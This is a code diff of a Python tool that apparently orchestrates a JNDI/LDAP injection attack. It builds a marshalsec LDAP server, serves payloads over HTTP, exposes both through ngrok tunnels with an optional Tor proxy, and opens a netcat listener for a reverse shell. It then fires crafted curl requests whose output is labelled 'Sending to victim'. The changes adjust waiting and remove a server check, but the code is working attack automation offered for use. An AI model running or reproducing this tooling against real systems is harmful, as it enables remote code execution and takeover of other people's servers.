@@ -41,6 +41,11 @@ class start_LDAP_Server():
     def getpid(self):
         return self.proc.pid
 
+    def wait(self):
+        while not self.forward_progress:
+            time.sleep(3)
+        return
+
     def run(self):
         os.chdir(self.path)
         if (os.path.isfile(self.path + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
@@ -80,7 +85,7 @@ class HTTP:
             self.proc.terminate()
             self.proc.kill()
             self.proc.send_signal(subprocess.signal.SIGKILL)
-
+    
     def run(self):
         self.proc = subprocess.run('exo-open --launch TerminalEmulator python3 -m http.server ' + port_http_server + ' --directory ' + abs_path + path_http_server + ' &', shell=True)
         return
@@ -99,17 +104,21 @@ def clear_process():
     else:
         return
 
+# def wait(ldap_server):
+#     while not ldap_server.forward_progress:
+#         time.sleep(3)
+#     return
+
 def execute(list_cmd, process):
     os.chdir(abs_path)
+    process.wait()
     list_code= []
     for cmd, code in list_cmd:
-        time.sleep(2)
+        time.sleep(3)
         if not process.stop_control:
             list_code.append(code)
             print("\nSending to victim:\n" + cmd)
-            p = subprocess.run(shlex.split(cmd))
-            running_process.append(p.pid)
-            
+            subprocess.run(shlex.split(cmd))
         else:
             msg = process.msg
             break
@@ -134,7 +143,7 @@ def ngrok_start():
     else:
         cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel.yml'
     subprocess.run(shlex.split(cmd))
-    
+    time.sleep(2)
     return
 
 def ngrok_get():
@@ -194,20 +203,6 @@ def git_clone():
         os.makedirs(path + "/" + path_ldap_server.split('/')[1])
         Repo.clone_from(git_url, path + path_ldap_server)
 
-def verify_server(process):
-    global host_http, port_ldap_server, host_http_ngrok
-    while not process.forward_progress:
-        time.sleep(3)
-    try:
-        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        clientsocket.connect((host_http_ngrok, int(port_ldap_server)))
-        clientsocket.sendall(b"Hi LDAP!")
-        clientsocket.close()
-        return True
-    except Exception as e:
-        if e.strerror:
-            return False
-        
 def ncat():
     cmd = 'exo-open --launch TerminalEmulator nc -lnvp ' + port_nc_server + ' &'
     subprocess.run(cmd, shell=True)
@@ -258,7 +253,7 @@ def prepare_list_commands():
         str_h = '-H "' + i + '" '
         str_header = str_header + str_h
     if use_tor:
-        string_tor = '--proxy socks5://127.0.0.1:' + port_tor_tunnel + ' '
+        string_tor = ' --proxy socks5://127.0.0.1:' + port_tor_tunnel + ' '
     terminate = False
     count = 0
     commands = []
@@ -349,7 +344,6 @@ def to_process():
                 pass
             p2 = executor.submit(ngrok_get,)
             result = p2.result()
-            add_tcp = False
             for a in result['tunnels']:
                 if a['proto'] == 'http':
                     host_http_ngrok = a['public_url'].split('//')[1]
@@ -395,18 +389,17 @@ def to_process():
         except concurrent.futures.TimeoutError:
             pass
         
-        progress = False
-        try:
-            p4 = executor.submit(verify_server, ldap_server)
-            progress = p4.result(timeout=30)
-        except concurrent.futures.TimeoutError:
-            pass
+        # try:
+        #     p4 = executor.submit(verify_server, ldap_server)
+        #     progress = p4.result(timeout=30)
+        # except concurrent.futures.TimeoutError:
+        #     pass
 
-        if progress:
-            pass
-        else:
-            print("LDAP server loading error. Restart aplication.")
-            end()
+        # if progress:
+        #     pass
+        # else:
+        #     print("LDAP server loading error. Restart aplication.")
+        #     end()
 
         p6 = executor.submit(execute, commands, ldap_server)
 
